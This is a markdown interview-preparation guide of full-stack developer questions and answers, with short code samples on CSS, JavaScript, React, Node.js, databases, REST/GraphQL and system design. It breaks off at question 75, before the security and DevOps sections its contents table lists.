# 🚀 Top 100 Full Stack Developer Interview Questions & Answers
### For Developers with 3 Years of Experience

---

## 📋 Table of Contents

1. [HTML & CSS (Q1–Q10)](#html--css)
2. [JavaScript (Q11–Q25)](#javascript)
3. [React / Frontend Framework (Q26–Q38)](#react--frontend-framework)
4. [Node.js & Backend (Q39–Q52)](#nodejs--backend)
5. [Databases (Q53–Q63)](#databases)
6. [REST API & GraphQL (Q64–Q70)](#rest-api--graphql)
7. [System Design & Architecture (Q71–Q78)](#system-design--architecture)
8. [DevOps & Deployment (Q79–Q85)](#devops--deployment)
9. [Security (Q86–Q91)](#security)
10. [Git & Version Control (Q92–Q96)](#git--version-control)
11. [General / Behavioral (Q97–Q100)](#general--behavioral)

---

## HTML & CSS

### Q1. What is the difference between `<div>` and `<span>`?

**Answer:**

| Feature | `<div>` | `<span>` |
|--------|---------|---------|
| Type | Block-level element | Inline element |
| Usage | Layout/grouping sections | Styling a part of text |
| Default display | Takes full width | Takes only content width |

```html
<div>This is a block element</div>
<p>This is a <span style="color:red">red word</span> in a sentence.</p>
```

---

### Q2. What is the CSS Box Model?

**Answer:**  
Every HTML element is a box with 4 layers:

```
+---------------------------+
|        MARGIN             |
|  +---------------------+  |
|  |      BORDER         |  |
|  |  +---------------+  |  |
|  |  |   PADDING     |  |  |
|  |  |  +---------+  |  |  |
|  |  |  | CONTENT |  |  |  |
|  |  |  +---------+  |  |  |
|  |  +---------------+  |  |
|  +---------------------+  |
+---------------------------+
```

- **Content** – actual text/image
- **Padding** – space inside the border
- **Border** – outline around padding
- **Margin** – space outside the border

---

### Q3. What is the difference between `position: relative`, `absolute`, `fixed`, and `sticky`?

**Answer:**

| Value | Relative To | Scrolls? |
|-------|------------|---------|
| `relative` | Its normal position | Yes |
| `absolute` | Nearest positioned ancestor | Yes |
| `fixed` | Viewport (browser window) | No (stays fixed) |
| `sticky` | Scrolls until threshold, then sticks | Partly |

---

### Q4. What is Flexbox and when do you use it?

**Answer:**  
Flexbox is a CSS layout model for aligning items in **one direction** (row or column).

```css
.container {
  display: flex;
  justify-content: center;   /* horizontal alignment */
  align-items: center;       /* vertical alignment */
  gap: 16px;
}
```

```
[ item1 ] [ item2 ] [ item3 ]   ← flex-direction: row (default)

[ item1 ]
[ item2 ]                       ← flex-direction: column
[ item3 ]
```

Use Flexbox for **navbars, card rows, centering elements**.

---

### Q5. What is CSS Grid and how is it different from Flexbox?

**Answer:**

| Feature | Flexbox | CSS Grid |
|---------|---------|---------|
| Dimension | 1D (row OR column) | 2D (rows AND columns) |
| Best for | Components, lists | Page layouts |
| Control | Child-driven | Parent-driven |

```css
.grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}
```

---

### Q6. What is the difference between `em`, `rem`, `px`, `%`, and `vh/vw`?

**Answer:**

| Unit | Relative To |
|------|------------|
| `px` | Fixed pixel value |
| `em` | Parent element font-size |
| `rem` | Root (`<html>`) font-size |
| `%` | Parent element size |
| `vh/vw` | Viewport height/width |

> ✅ **Best practice:** Use `rem` for font sizes, `px` for borders, `%` or `fr` for layouts.

---

### Q7. What are semantic HTML elements? Give examples.

**Answer:**  
Semantic elements **describe their meaning** to browsers and developers.

```
Non-semantic:  <div>, <span>
Semantic:      <header>, <nav>, <main>, <article>, <section>, <footer>, <aside>
```

**Why use them?**
- Better SEO
- Better accessibility (screen readers)
- Cleaner, readable code

---

### Q8. What is the difference between `localStorage`, `sessionStorage`, and `cookies`?

**Answer:**

| Feature | localStorage | sessionStorage | Cookies |
|---------|-------------|----------------|---------|
| Capacity | ~5MB | ~5MB | ~4KB |
| Expiry | Never (manual clear) | Tab close | Custom |
| Sent to server | No | No | Yes |
| Accessible via JS | Yes | Yes | Yes (if no httpOnly) |

---

### Q9. What is responsive design? How do you implement it?

**Answer:**  
Responsive design makes a website look good on **all screen sizes**.

```css
/* Mobile first approach */
.card { width: 100%; }

@media (min-width: 768px) {
  .card { width: 50%; }
}

@media (min-width: 1024px) {
  .card { width: 33%; }
}
```

Tools: **CSS Grid, Flexbox, Media Queries, viewport meta tag**

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

---

### Q10. What is the difference between `display: none` and `visibility: hidden`?

**Answer:**

| Property | Space in layout | Visible |
|---------|----------------|---------|
| `display: none` | ❌ Removed | ❌ No |
| `visibility: hidden` | ✅ Kept | ❌ No |
| `opacity: 0` | ✅ Kept | ❌ No (but clickable!) |

---

## JavaScript

### Q11. What is the difference between `var`, `let`, and `const`?

**Answer:**

| Feature | var | let | const |
|---------|-----|-----|-------|
| Scope | Function | Block | Block |
| Hoisting | Yes (undefined) | Yes (TDZ error) | Yes (TDZ error) |
| Re-declare | Yes | No | No |
| Re-assign | Yes | Yes | No |

```js
var x = 1;   // function scoped, avoid in modern JS
let y = 2;   // block scoped, reassignable
const z = 3; // block scoped, not reassignable
```

---

### Q12. What is a closure in JavaScript?

**Answer:**  
A closure is a function that **remembers variables from its outer scope** even after the outer function has returned.

```js
function counter() {
  let count = 0;
  return function() {
    count++;
    return count;
  };
}

const increment = counter();
console.log(increment()); // 1
console.log(increment()); // 2
console.log(increment()); // 3
```

```
counter() runs → returns inner function
inner function "closes over" count variable
count stays alive in memory
```

---

### Q13. What is the Event Loop in JavaScript?

**Answer:**  
JavaScript is **single-threaded** but handles async with the Event Loop.

```
  Call Stack          Web APIs         Callback Queue
  ----------        ----------         --------------
  | main()  |  →   | setTimeout |  →  | callback() |
  | console |      | fetch      |     | handler()  |
  ----------        ----------         --------------
         ↑                                    |
         +------------------------------------+
                    Event Loop
                  (moves callbacks to stack when stack is empty)
```

**Order:** Synchronous → Microtasks (Promises) → Macrotasks (setTimeout)

---

### Q14. What is the difference between `==` and `===`?

**Answer:**

```js
// == (loose equality) - converts types
0 == "0"    // true
null == undefined // true
false == 0  // true

// === (strict equality) - no type conversion
0 === "0"   // false
null === undefined // false
false === 0 // false
```

> ✅ Always use `===` in production code.

---

### Q15. What are Promises and how do they work?

**Answer:**  
A Promise represents a **future value** — it's either pending, fulfilled, or rejected.

```
Promise States:
  PENDING → FULFILLED (resolve)
          → REJECTED  (reject)
```

```js
const fetchData = new Promise((resolve, reject) => {
  setTimeout(() => resolve("Data received!"), 1000);
});

fetchData
  .then(data => console.log(data))   // "Data received!"
  .catch(err => console.error(err));
```

---

### Q16. What is `async/await` and how does it relate to Promises?

**Answer:**  
`async/await` is **syntactic sugar** over Promises — makes async code look synchronous.

```js
// Promise way
fetch('/api/users')
  .then(res => res.json())
  .then(data => console.log(data));

// async/await way (cleaner)
async function getUsers() {
  try {
    const res = await fetch('/api/users');
    const data = await res.json();
    console.log(data);
  } catch (err) {
    console.error(err);
  }
}
```

---

### Q17. What is the difference between `call`, `apply`, and `bind`?

**Answer:**  
All three **set the `this` context** for a function.

```js
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}

const user = { name: "Alice" };

greet.call(user, "Hello", "!");       // calls immediately, args as list
greet.apply(user, ["Hello", "!"]);    // calls immediately, args as array
const boundFn = greet.bind(user);     // returns new function, call later
boundFn("Hello", "!");
```

---

### Q18. What is prototypal inheritance in JavaScript?

**Answer:**  
Every JS object has a hidden `__proto__` link to another object (its prototype). It **inherits properties** from that chain.

```
myObj → Object.prototype → null

myArray → Array.prototype → Object.prototype → null
```

```js
function Animal(name) {
  this.name = name;
}
Animal.prototype.speak = function() {
  return `${this.name} makes a sound.`;
};

const dog = new Animal("Dog");
dog.speak(); // "Dog makes a sound."
```

---

### Q19. What is event delegation?

**Answer:**  
Instead of attaching listeners to **every child**, attach one listener to the **parent** and use `event.target`.

```js
// ❌ Inefficient
document.querySelectorAll('li').forEach(li =>
  li.addEventListener('click', handler)
);

// ✅ Event Delegation
document.querySelector('ul').addEventListener('click', (e) => {
  if (e.target.tagName === 'LI') {
    console.log('Clicked:', e.target.textContent);
  }
});
```

**Benefits:** Better performance, works for dynamically added elements.

---

### Q20. What is debouncing and throttling?

**Answer:**

**Debounce** – waits until user **stops** triggering (e.g., search input)  
**Throttle** – fires at most **once per interval** (e.g., scroll events)

```js
// Debounce
function debounce(fn, delay) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delay);
  };
}

// Throttle
function throttle(fn, interval) {
  let lastTime = 0;
  return (...args) => {
    const now = Date.now();
    if (now - lastTime >= interval) {
      lastTime = now;
      fn(...args);
    }
  };
}
```

---

### Q21. What are JavaScript Generators?

**Answer:**  
Generators are functions that can be **paused and resumed** using `yield`.

```js
function* counter() {
  yield 1;
  yield 2;
  yield 3;
}

const gen = counter();
gen.next(); // { value: 1, done: false }
gen.next(); // { value: 2, done: false }
gen.next(); // { value: 3, done: false }
gen.next(); // { value: undefined, done: true }
```

---

### Q22. What is the difference between `null` and `undefined`?

**Answer:**

| | null | undefined |
|--|------|-----------|
| Meaning | Intentionally empty | Variable declared but not assigned |
| Type | object (quirk) | undefined |
| Set by | Developer | JavaScript engine |

```js
let a;          // undefined
let b = null;   // null (intentional empty)
```

---

### Q23. What is memoization?

**Answer:**  
Memoization **caches the results** of expensive function calls.

```js
function memoize(fn) {
  const cache = {};
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache[key]) return cache[key];
    cache[key] = fn(...args);
    return cache[key];
  };
}

const slowSquare = memoize(n => n * n);
slowSquare(5); // calculates → 25
slowSquare(5); // from cache → 25
```

---

### Q24. What is the spread operator and rest parameter?

**Answer:**

```js
// Spread (...) - expands array/object
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5]; // [1, 2, 3, 4, 5]

const obj1 = { a: 1 };
const obj2 = { ...obj1, b: 2 }; // { a: 1, b: 2 }

// Rest (...) - collects remaining args
function sum(...nums) {
  return nums.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3, 4); // 10
```

---

### Q25. What is the difference between deep copy and shallow copy?

**Answer:**

```js
const original = { a: 1, b: { c: 2 } };

// Shallow copy - nested objects still shared
const shallow = { ...original };
shallow.b.c = 99;
console.log(original.b.c); // 99 ← affected!

// Deep copy - completely independent
const deep = JSON.parse(JSON.stringify(original));
deep.b.c = 99;
console.log(original.b.c); // 2 ← not affected
```

> For complex cases use `structuredClone()` or libraries like `lodash.cloneDeep`.

---

## React / Frontend Framework

### Q26. What is the Virtual DOM and how does React use it?

**Answer:**  
The Virtual DOM is a **lightweight JS copy** of the real DOM. React updates the virtual DOM first, then **diffs** it with the previous version (reconciliation), and only updates the **changed parts** in the real DOM.

```
State Change
     ↓
New Virtual DOM created
     ↓
Diff with Previous Virtual DOM (Reconciliation)
     ↓
Only changed nodes updated in Real DOM
     ↓
Browser repaints
```

---

### Q27. What are React Hooks? Name the most common ones.

**Answer:**  
Hooks let you use state and lifecycle features **without class components**.

| Hook | Purpose |
|------|---------|
| `useState` | Local state |
| `useEffect` | Side effects (API calls, subscriptions) |
| `useContext` | Consume context |
| `useRef` | DOM refs, mutable values |
| `useMemo` | Memoize computed values |
| `useCallback` | Memoize functions |
| `useReducer` | Complex state logic |

---

### Q28. What is the difference between `useEffect` with no deps, empty deps `[]`, and with deps?

**Answer:**

```js
// Runs after EVERY render
useEffect(() => { ... });

// Runs ONCE after mount (like componentDidMount)
useEffect(() => { ... }, []);

// Runs when 'count' changes
useEffect(() => { ... }, [count]);

// Cleanup function (like componentWillUnmount)
useEffect(() => {
  const sub = subscribe();
  return () => sub.unsubscribe(); // cleanup
}, []);
```

---

### Q29. What is the Context API and when should you use it?

**Answer:**  
Context provides a way to **share data globally** without prop drilling.

```
Without Context:          With Context:
App                       App (provides value)
 └─ Parent                 ├─ Parent
     └─ Child              │   └─ Child
         └─ GrandChild     └─ GrandChild (consumes directly)
(passes props every step)
```

```js
const ThemeContext = React.createContext('light');

// Provider
<ThemeContext.Provider value="dark">
  <App />
</ThemeContext.Provider>

// Consumer
const theme = useContext(ThemeContext);
```

> Use Context for: theme, auth user, language. For complex state → use Redux/Zustand.

---

### Q30. What is `useMemo` vs `useCallback`?

**Answer:**

```js
// useMemo - memoizes a COMPUTED VALUE
const sortedList = useMemo(() => {
  return heavySort(items);
}, [items]);

// useCallback - memoizes a FUNCTION
const handleClick = useCallback(() => {
  doSomething(id);
}, [id]);
```

| Hook | Returns | Use when |
|------|---------|---------|
| `useMemo` | A value | Expensive calculations |
| `useCallback` | A function | Passing callbacks to child components |

---

### Q31. What is prop drilling and how do you avoid it?

**Answer:**  
Prop drilling = passing props through **many intermediate components** that don't use them.

```
App (has user)
 └─ Layout (passes user)
     └─ Sidebar (passes user)
         └─ UserAvatar (finally uses user)  ← prop drilled
```

**Solutions:**
- React Context API
- Redux / Zustand
- Composition pattern

---

### Q32. What is the difference between controlled and uncontrolled components?

**Answer:**

```js
// Controlled - React manages state
const [value, setValue] = useState('');
<input value={value} onChange={e => setValue(e.target.value)} />

// Uncontrolled - DOM manages state
const inputRef = useRef();
<input ref={inputRef} />
// Access with inputRef.current.value
```

> ✅ Controlled is preferred for form validation and predictability.

---

### Q33. What is React.memo?

**Answer:**  
`React.memo` wraps a component to **prevent re-renders** if props haven't changed.

```js
const UserCard = React.memo(({ name, age }) => {
  console.log("Rendered!");
  return <div>{name} - {age}</div>;
});

// Only re-renders if name or age changes
```

---

### Q34. What is the difference between `useState` and `useReducer`?

**Answer:**

```js
// useState - simple state
const [count, setCount] = useState(0);

// useReducer - complex state with actions
const reducer = (state, action) => {
  switch(action.type) {
    case 'increment': return { count: state.count + 1 };
    case 'decrement': return { count: state.count - 1 };
    default: return state;
  }
};
const [state, dispatch] = useReducer(reducer, { count: 0 });
dispatch({ type: 'increment' });
```

> Use `useReducer` when you have **multiple related state values** or complex transitions.

---

### Q35. What is code splitting and lazy loading in React?

**Answer:**

```js
// Without lazy loading - loads ALL components at startup
import HeavyComponent from './HeavyComponent';

// With lazy loading - loads only when needed
const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}
```

**Benefit:** Smaller initial bundle → faster page load.

---

### Q36. What is reconciliation in React?

**Answer:**  
Reconciliation is React's algorithm to **efficiently update the DOM** by comparing the old and new virtual DOM trees.

**Key rules:**
- Elements of different types → rebuild entire subtree
- Same type → update only changed attributes
- Lists use `key` prop to identify items

```js
// Without key - React can't efficiently update list
<li>{item}</li>

// With key - React tracks each item
<li key={item.id}>{item.name}</li>
```

---

### Q37. What are Higher-Order Components (HOC)?

**Answer:**  
A HOC is a **function that takes a component and returns a new enhanced component**.

```js
// HOC that adds loading logic
function withLoading(Component) {
  return function WithLoadingComponent({ isLoading, ...props }) {
    if (isLoading) return <div>Loading...</div>;
    return <Component {...props} />;
  };
}

const UserListWithLoading = withLoading(UserList);
```

---

### Q38. What is the difference between React state and props?

**Answer:**

| Feature | Props | State |
|---------|-------|-------|
| Source | Parent component | Component itself |
| Mutable | ❌ Read-only | ✅ Yes (via setState) |
| Triggers re-render | Yes | Yes |
| Passed down | Yes | No (local) |

```
Parent → (props) → Child
Child manages its own state internally
```

---

## Node.js & Backend

### Q39. What is Node.js and why is it used for backend?

**Answer:**  
Node.js is a **JavaScript runtime built on Chrome's V8 engine** that runs JS outside the browser.

```
Browser JS  →  DOM, window, document
Node.js     →  fs, http, os, path (no DOM)
```

**Why Node.js?**
- Non-blocking I/O → handles thousands of concurrent requests
- Same language (JS) for front and back end
- Huge npm ecosystem
- Great for real-time apps (chat, live updates)

---

### Q40. What is middleware in Express.js?

**Answer:**  
Middleware is a function that runs **between the request and response** in the request pipeline.

```
Request → [Auth Middleware] → [Logger] → [Route Handler] → Response
```

```js
// Custom middleware
app.use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next(); // pass to next middleware
});

// Route-level middleware
app.get('/dashboard', authMiddleware, (req, res) => {
  res.send('Welcome!');
});
```

---

### Q41. What is the difference between `require` (CommonJS) and `import` (ES Modules)?

**Answer:**

```js
// CommonJS (require) - Node.js default
const express = require('express');
module.exports = { myFunc };

// ES Modules (import) - Modern standard
import express from 'express';
export const myFunc = () => {};
```

| Feature | CommonJS | ES Modules |
|---------|---------|------------|
| Loading | Synchronous | Asynchronous |
| Used in | Node.js (default) | Browsers + modern Node |
| Tree shaking | ❌ | ✅ |

---

### Q42. How does Node.js handle async operations?

**Answer:**  
Node.js uses an **event loop + libuv** for non-blocking I/O.

```
Request comes in
      ↓
Node delegates to OS/libuv (file read, DB query)
      ↓
Node continues handling other requests (non-blocking)
      ↓
When OS completes → callback queued → event loop picks it up
      ↓
Response sent
```

This is why Node handles **10,000+ concurrent connections** efficiently.

---

### Q43. What is JWT (JSON Web Token) and how does it work?

**Answer:**  
JWT is a **compact token** for authentication, containing encoded user data.

```
JWT Structure:
HEADER.PAYLOAD.SIGNATURE

eyJhbGciOiJIUzI1NiJ9  ←  Header (algorithm)
.eyJ1c2VySWQiOjF9     ←  Payload (user data)
.SflKxwRJSMeKKF2QT4f  ←  Signature (verification)
```

```js
// Create token
const token = jwt.sign({ userId: 1, role: 'admin' }, SECRET_KEY, { expiresIn: '1h' });

// Verify token
const decoded = jwt.verify(token, SECRET_KEY);
```

**Flow:**
```
Login → Server creates JWT → Client stores it
→ Client sends JWT in header → Server verifies → Access granted
```

---

### Q44. What is the difference between authentication and authorization?

**Answer:**

| | Authentication | Authorization |
|--|---------------|--------------|
| Question | Who are you? | What can you do? |
| Example | Login with email/password | Admin can delete users |
| When | First step | After authentication |

```
User logs in (Authentication)
     ↓
Server checks role (Authorization)
     ↓
Admin → access /admin
User  → access /dashboard only
```

---

### Q45. What is CORS and how do you handle it?

**Answer:**  
CORS (Cross-Origin Resource Sharing) is a browser security mechanism that **blocks requests from different origins**.

```
Frontend: http://localhost:3000
Backend:  http://localhost:5000   ← different origin → CORS error!
```

**Fix in Express:**
```js
const cors = require('cors');

app.use(cors({
  origin: 'http://localhost:3000',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true
}));
```

---

### Q46. What is rate limiting and why is it important?

**Answer:**  
Rate limiting **controls how many requests** a client can make in a given time window.

```
Client → [Rate Limiter] → Server
         ↓ if limit exceeded
         429 Too Many Requests
```

```js
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests
});

app.use('/api/', limiter);
```

---

### Q47. What is the difference between SQL and NoSQL databases?

**Answer:**

| Feature | SQL | NoSQL |
|---------|-----|-------|
| Structure | Tables with rows/cols | Documents, key-value, graph |
| Schema | Fixed | Flexible |
| Scaling | Vertical | Horizontal |
| Examples | PostgreSQL, MySQL | MongoDB, Redis, DynamoDB |
| Use for | Relations, transactions | Large scale, flexible data |

---

### Q48. What is connection pooling in databases?

**Answer:**  
Connection pooling **reuses database connections** instead of creating a new one for each request.

```
Without pooling:         With pooling:
Request → Open DB conn   Request → Get conn from POOL
→ Query                  → Query
→ Close conn             → Return conn to POOL
(slow, resource heavy)   (fast, reusable)

POOL: [conn1] [conn2] [conn3] ... [conn10]
```

```js
const pool = mysql.createPool({
  host: 'localhost',
  connectionLimit: 10, // max 10 connections
  database: 'mydb'
});
```

---

### Q49. What is an ORM? Give examples.

**Answer:**  
An ORM (Object Relational Mapper) lets you **interact with databases using code objects** instead of raw SQL.

```js
// Raw SQL
db.query('SELECT * FROM users WHERE id = 1');

// With ORM (Prisma)
const user = await prisma.user.findUnique({ where: { id: 1 } });
```

**Popular ORMs:**
- **Prisma** – modern, type-safe (Node.js)
- **Sequelize** – classic Node.js ORM
- **TypeORM** – TypeScript-first
- **Mongoose** – MongoDB ODM

---

### Q50. What are environment variables and why do you use them?

**Answer:**  
Environment variables store **sensitive config data** outside your code.

```
.env file (never commit to git!)
------------------------------
PORT=3000
DB_URL=mongodb://localhost:27017
JWT_SECRET=mysecretkey123
```

```js
require('dotenv').config();

const port = process.env.PORT || 3000;
const dbUrl = process.env.DB_URL;
```

---

### Q51. What is the MVC design pattern?

**Answer:**

```
MVC = Model + View + Controller

Model      → Database logic (User schema, queries)
View       → UI / Templates / JSON response
Controller → Business logic, handles requests/responses

Request → Controller → Model (get data) → Controller → View (render) → Response
```

```
project/
├── models/       ← User.js, Product.js
├── views/        ← index.html or JSON
├── controllers/  ← userController.js
└── routes/       ← userRoutes.js
```

---

### Q52. What is the difference between `process.nextTick()` and `setImmediate()`?

**Answer:**

```
Event Loop order:
1. Current operation completes
2. process.nextTick() callbacks  ← runs before I/O
3. Promise microtasks
4. I/O callbacks
5. setImmediate() callbacks      ← runs after I/O
6. setTimeout/setInterval
```

- `process.nextTick` – fires **before** I/O events (very high priority)
- `setImmediate` – fires **after** I/O events in next iteration

---

## Databases

### Q53. What is indexing in databases and why is it important?

**Answer:**  
An index is a **data structure that speeds up queries** by avoiding full table scans.

```
Without index:     [row1][row2][row3]...[row1000000]  ← scan all
With index:        B-Tree index → jump directly to result

Query: WHERE email = 'alice@example.com'
Without index: O(n)  → checks every row
With index:    O(log n) → direct lookup
```

```sql
CREATE INDEX idx_user_email ON users(email);
```

> ⚠️ Indexes speed up reads but **slow down writes**. Don't over-index.

---

### Q54. What are ACID properties in databases?

**Answer:**

| Property | Meaning | Example |
|----------|---------|---------|
| **A**tomicity | All or nothing | Bank transfer: both debit + credit succeed or both fail |
| **C**onsistency | Data remains valid | Balance never goes negative |
| **I**solation | Transactions don't interfere | Two transfers run independently |
| **D**urability | Committed data persists | Power loss doesn't lose data |

---

### Q55. What is the difference between `INNER JOIN`, `LEFT JOIN`, `RIGHT JOIN`?

**Answer:**

```
Table A: [1, 2, 3]   Table B: [2, 3, 4]

INNER JOIN:  [2, 3]          ← only matching rows
LEFT JOIN:   [1, 2, 3]       ← all of A + matching B (nulls for no match)
RIGHT JOIN:  [2, 3, 4]       ← all of B + matching A (nulls for no match)
FULL JOIN:   [1, 2, 3, 4]    ← all rows from both
```

```sql
SELECT u.name, o.total
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
-- Returns all users, even if they have no orders
```

---

### Q56. What is normalization in databases?

**Answer:**  
Normalization **reduces data redundancy** by organizing tables properly.

```
Before normalization (redundant):
| order_id | customer_name | customer_email    | product |
|----------|--------------|-------------------|---------|
| 1        | Alice        | alice@example.com | Laptop  |
| 2        | Alice        | alice@example.com | Phone   |  ← duplicated!

After normalization:
customers: | id | name  | email             |
orders:    | id | cust_id | product         |
```

**Normal Forms:** 1NF → 2NF → 3NF → BCNF

---

### Q57. What is the difference between `DELETE`, `TRUNCATE`, and `DROP`?

**Answer:**

| Command | Removes | Rollback? | Speed |
|---------|---------|-----------|-------|
| `DELETE` | Rows (with WHERE) | ✅ Yes | Slow |
| `TRUNCATE` | All rows | ❌ No | Fast |
| `DROP` | Entire table | ❌ No | Fast |

```sql
DELETE FROM users WHERE id = 5;   -- removes specific row
TRUNCATE TABLE logs;               -- clears all rows, keeps structure
DROP TABLE old_users;              -- removes table entirely
```

---

### Q58. What is MongoDB and how is it different from SQL databases?

**Answer:**

```
SQL (PostgreSQL):
  Table → Row → Column
  { id: 1, name: "Alice", age: 25 }

MongoDB:
  Collection → Document → Field
  { _id: ObjectId("..."), name: "Alice", age: 25, hobbies: ["coding", "gaming"] }
```

**Key differences:**
- MongoDB stores **BSON documents** (like JSON)
- No fixed schema — each document can have different fields
- Better for **hierarchical/nested data**
- Horizontal scaling built-in (sharding)

---

### Q59. What are MongoDB indexes?

**Answer:**

```js
// Create index
db.users.createIndex({ email: 1 });           // ascending
db.users.createIndex({ email: 1 }, { unique: true }); // unique
db.users.createIndex({ name: "text" });       // text search
db.users.createIndex({ location: "2dsphere" }); // geo

// Check query performance
db.users.find({ email: "alice@test.com" }).explain("executionStats");
```

---

### Q60. What is Redis and what is it used for?

**Answer:**  
Redis is an **in-memory key-value store** — extremely fast (sub-millisecond).

**Common uses:**
- **Caching** – store DB query results
- **Session storage** – user sessions
- **Rate limiting** – count requests per IP
- **Pub/Sub** – real-time messaging
- **Queues** – background job queues

```js
await redis.set('user:1', JSON.stringify(user), 'EX', 3600); // cache for 1hr
const cached = await redis.get('user:1');
```

---

### Q61. What is a transaction in a database?

**Answer:**  
A transaction is a **group of operations** that execute as a single unit.

```js
// MongoDB transaction example
const session = await mongoose.startSession();
session.startTransaction();

try {
  await Account.updateOne({ _id: from }, { $inc: { balance: -100 } }, { session });
  await Account.updateOne({ _id: to },   { $inc: { balance: +100 } }, { session });
  await session.commitTransaction();
} catch (err) {
  await session.abortTransaction(); // rollback both
}
```

---

### Q62. What is N+1 query problem and how do you solve it?

**Answer:**

```
N+1 Problem:
1 query to get 10 users
+ 10 queries to get each user's posts
= 11 queries total!  ← very inefficient

Solution - Eager loading / populate:
```

```js
// ❌ N+1 Problem
const users = await User.find();
for (const user of users) {
  user.posts = await Post.find({ userId: user._id }); // 1 per user!
}

// ✅ Fixed with populate / joins
const users = await User.find().populate('posts');
// 2 queries total
```

---

### Q63. What is database sharding?

**Answer:**  
Sharding splits a **large database across multiple servers** (horizontal scaling).

```
Without sharding:        With sharding:
[All 100M users]         Shard 1: [Users A-H]
on 1 server              Shard 2: [Users I-P]
(slow under load)        Shard 3: [Users Q-Z]
                         (distributed load)
```

**Shard keys** determine which shard gets the data.

---

## REST API & GraphQL

### Q64. What are the HTTP methods and when to use them?

**Answer:**

| Method | Use For | Body? |
|--------|---------|-------|
| GET | Fetch data | ❌ No |
| POST | Create resource | ✅ Yes |
| PUT | Replace entire resource | ✅ Yes |
| PATCH | Update partial resource | ✅ Yes |
| DELETE | Delete resource | Optional |

```
GET    /users          → list all users
GET    /users/1        → get user with id 1
POST   /users          → create new user
PUT    /users/1        → replace user 1
PATCH  /users/1        → update part of user 1
DELETE /users/1        → delete user 1
```

---

### Q65. What are HTTP status codes? Give common examples.

**Answer:**

| Range | Category | Examples |
|-------|---------|---------|
| 2xx | Success | 200 OK, 201 Created, 204 No Content |
| 3xx | Redirect | 301 Moved, 304 Not Modified |
| 4xx | Client Error | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests |
| 5xx | Server Error | 500 Internal Error, 502 Bad Gateway, 503 Service Unavailable |

---

### Q66. What is REST vs GraphQL?

**Answer:**

| Feature | REST | GraphQL |
|---------|------|---------|
| Endpoints | Many (`/users`, `/posts`) | Single (`/graphql`) |
| Data fetching | Fixed response | Request exactly what you need |
| Over-fetching | Common | ❌ No |
| Under-fetching | Multiple requests needed | ❌ No (fetch related in one call) |
| Learning curve | Low | Medium |

```graphql
# GraphQL - get exactly what you need
query {
  user(id: "1") {
    name
    posts {
      title
    }
  }
}
```

---

### Q67. What is pagination and how do you implement it?

**Answer:**

**Offset Pagination:**
```js
GET /users?page=2&limit=10

const users = await User.find()
  .skip((page - 1) * limit)
  .limit(limit);
```

**Cursor Pagination (better for large datasets):**
```js
GET /users?cursor=abc123&limit=10

const users = await User.find({ _id: { $gt: cursor } }).limit(10);
```

> Cursor pagination is more **efficient and consistent** for infinite scroll.

---

### Q68. What is API versioning and why is it important?

**Answer:**  
API versioning ensures **old clients don't break** when you update the API.

```
# URL versioning (most common)
GET /api/v1/users
GET /api/v2/users

# Header versioning
GET /api/users
Headers: { API-Version: 2 }
```

---

### Q69. What is idempotency in REST APIs?

**Answer:**  
An operation is idempotent if **calling it multiple times gives the same result**.

| Method | Idempotent? |
|--------|------------|
| GET | ✅ Yes |
| PUT | ✅ Yes |
| DELETE | ✅ Yes |
| POST | ❌ No (creates new each time) |
| PATCH | Depends |

```
DELETE /users/1 → deletes user
DELETE /users/1 → still deleted (same result)  ← idempotent
```

---

### Q70. What is WebSocket and when would you use it over REST?

**Answer:**  
WebSocket provides a **persistent two-way connection** between client and server.

```
REST (request/response):
Client → Request → Server → Response  (each message = new connection)

WebSocket (persistent):
Client ←→ Server  (open channel, both can send anytime)
```

**Use WebSockets for:**
- Live chat apps
- Real-time notifications
- Live dashboards / stock prices
- Multiplayer games

---

## System Design & Architecture

### Q71. What is the difference between monolithic and microservices architecture?

**Answer:**

```
Monolithic:                  Microservices:
+------------------+         +-------+  +-------+  +------+
|  Auth            |         | Auth  |  | Users |  | Shop |
|  Users           |         | Svc   |  | Svc   |  | Svc  |
|  Products        |         +-------+  +-------+  +------+
|  Orders          |              ↓          ↓         ↓
|  Payments        |         API Gateway (routes requests)
+------------------+
    One big app               Many small services
```

| | Monolithic | Microservices |
|--|-----------|--------------|
| Deployment | One unit | Independent |
| Scaling | Scale whole app | Scale per service |
| Complexity | Simple | Complex |
| Best for | Small/medium apps | Large teams, high scale |

---

### Q72. What is caching and what are caching strategies?

**Answer:**

```
Without cache:    Client → Server → Database (slow)
With cache:       Client → Cache → return! (fast)
                         ↓ (cache miss)
                         Server → Database → update cache
```

**Strategies:**

| Strategy | Description |
|----------|-------------|
| **Cache-Aside** | App checks cache first, fills on miss |
| **Write-Through** | Write to cache + DB simultaneously |
| **Write-Back** | Write to cache, sync DB later |
| **Read-Through** | Cache handles DB reads automatically |

---

### Q73. What is a load balancer?

**Answer:**  
A load balancer **distributes incoming traffic** across multiple servers.

```
            +------------------+
Clients →   |   Load Balancer  |  → Server 1
            |  (Round Robin /  |  → Server 2
            |   Least Conn.)   |  → Server 3
            +------------------+
```

**Algorithms:**
- **Round Robin** – distribute equally in order
- **Least Connections** – send to least busy server
- **IP Hash** – same client → same server

---

### Q74. What is a CDN and why do you use it?

**Answer:**  
A CDN (Content Delivery Network) serves static assets from **geographically distributed servers** close to the user.

```
Without CDN:          With CDN:
User (India)          User (India)
     ↓                     ↓
Server (USA)          CDN Edge (India)   ← much closer!
(high latency)        (low latency)
```

**Used for:** images, CSS, JS bundles, videos.

---

### Q75. What is horizontal vs vertical scaling?

**Answer:**

```
